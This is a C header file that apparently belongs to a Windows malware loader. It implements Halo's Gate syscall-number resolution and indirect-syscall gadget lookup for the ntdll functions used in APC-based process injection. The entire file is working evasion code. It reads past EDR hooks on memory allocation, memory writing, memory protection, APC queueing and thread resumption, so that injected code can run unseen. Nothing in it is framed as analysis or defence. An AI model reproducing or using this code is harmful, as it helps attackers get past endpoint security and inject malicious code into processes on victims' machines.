#pragma once
#include <windows.h>
#include <stdio.h>

// globals defined in syscalls.S
extern DWORD     g_NtAllocSsn;
extern DWORD     g_NtWriteSsn;
extern DWORD     g_NtProtectSsn;
extern DWORD     g_NtQueueApcSsn;
extern DWORD     g_NtResumeSsn;

extern ULONG_PTR g_NtAllocAddr;
extern ULONG_PTR g_NtWriteAddr;
extern ULONG_PTR g_NtProtectAddr;
extern ULONG_PTR g_NtQueueApcAddr;
extern ULONG_PTR g_NtResumeAddr;

static BOOLEAN GetSSNInternal( PBYTE NtFunction, PWORD SSN )
{
    DWORD Offset  = 0;
    BYTE  SSNLow  = 0;
    BYTE  SSNHigh = 0;

    if ( !SSN )
        return FALSE;

    do {
        if ( *( NtFunction + Offset ) == 0xC3 )
            break;

        if ( *( NtFunction + Offset + 0 ) == 0x4C &&
             *( NtFunction + Offset + 1 ) == 0x8B &&
             *( NtFunction + Offset + 2 ) == 0xD1 &&
             *( NtFunction + Offset + 3 ) == 0xB8 )
        {
            SSNLow  = *( NtFunction + Offset + 4 );
            SSNHigh = *( NtFunction + Offset + 5 );
            *SSN    = ( SSNHigh << 8 ) | SSNLow;
            return TRUE;
        }
        Offset++;
    } while ( TRUE );

    return FALSE;
}

static DWORD GetFunctionSize( PVOID Function )
{
    PBYTE                   Module           = ( PBYTE ) GetModuleHandleA( "ntdll.dll" );
    PIMAGE_NT_HEADERS       NtHeader         = ( PIMAGE_NT_HEADERS )( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = ( PIMAGE_EXPORT_DIRECTORY )( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    SIZE_T                  ExpDirectorySize = NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    PDWORD                  AddrOfFunctions  = ( PDWORD )( Module + ExpDirectory->AddressOfFunctions );
    PDWORD                  AddrOfNames      = ( PDWORD )( Module + ExpDirectory->AddressOfNames );
    PWORD                   AddrOfOrdinals   = ( PWORD  )( Module + ExpDirectory->AddressOfNameOrdinals );
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    PBYTE                   Addr1            = NULL;
    PBYTE                   Addr2            = NULL;
    DWORD                   SyscallSize      = 0;
    DWORD                   Offset           = 0;

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        if ( ( PBYTE ) FunctionAddr >= ( PBYTE ) ExpDirectory &&
             ( PBYTE ) FunctionAddr  < ( PBYTE ) ExpDirectory + ExpDirectorySize )
            continue;

        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( *( PWORD ) FunctionName != 0x775a )
            continue;

        if ( !Addr1 ) {
            Addr1 = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
            continue;
        }

        Addr2  = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
        Offset = Addr1 > Addr2 ? Addr1 - Addr2 : Addr2 - Addr1;

        if ( !SyscallSize || Offset < SyscallSize )
            SyscallSize = Offset;
    }

    return SyscallSize;
}

static WORD GetSSN( PBYTE NtFunction )
{
    WORD   SSN       = 0;
    DWORD  Counter   = 0;
    DWORD  SzNtApi   = 0;
    PVOID  Neighbour = NULL;

    if ( GetSSNInternal( NtFunction, &SSN ) )
        return SSN;

    SzNtApi = GetFunctionSize( NtFunction );

    while ( SSN == 0 && Counter < 200 ) {
        Neighbour = NtFunction + ( SzNtApi * Counter );
        if ( GetSSNInternal( Neighbour, &SSN ) ) { SSN -= Counter; break; }

        Neighbour = NtFunction - ( SzNtApi * Counter );
        if ( GetSSNInternal( Neighbour, &SSN ) ) { SSN += Counter; break; }

        Counter++;
    }

    return SSN;
}

// Populate all SSN and indirect syscall gadget globals.
// SSNs: resolved via Halo's Gate (walks neighbors if stub is hooked).
// Addrs: func+0x12 inside ntdll where the syscall instruction lives.
static int resolve_halos_gate( void )
{
    HMODULE ntdll = GetModuleHandleA( "ntdll.dll" );
    PBYTE   p     = NULL;

    #define RESOLVE( name, ssn_g, addr_g ) \
        p = ( PBYTE ) GetProcAddress( ntdll, (name) ); \
        ssn_g  = ( DWORD ) GetSSN( p ); \
        addr_g = ( ULONG_PTR ) p + 0x12; \
        printf( "[*] %-32s SSN=0x%02X  gadget=%p\n", name, ssn_g, ( void* ) addr_g )

    RESOLVE( "NtAllocateVirtualMemory", g_NtAllocSsn,    g_NtAllocAddr    );
    RESOLVE( "NtWriteVirtualMemory",    g_NtWriteSsn,     g_NtWriteAddr    );
    RESOLVE( "NtProtectVirtualMemory",  g_NtProtectSsn,   g_NtProtectAddr  );
    RESOLVE( "NtQueueApcThread",        g_NtQueueApcSsn,  g_NtQueueApcAddr );
    RESOLVE( "NtResumeThread",          g_NtResumeSsn,    g_NtResumeAddr   );

    #undef RESOLVE
    return 0;
}
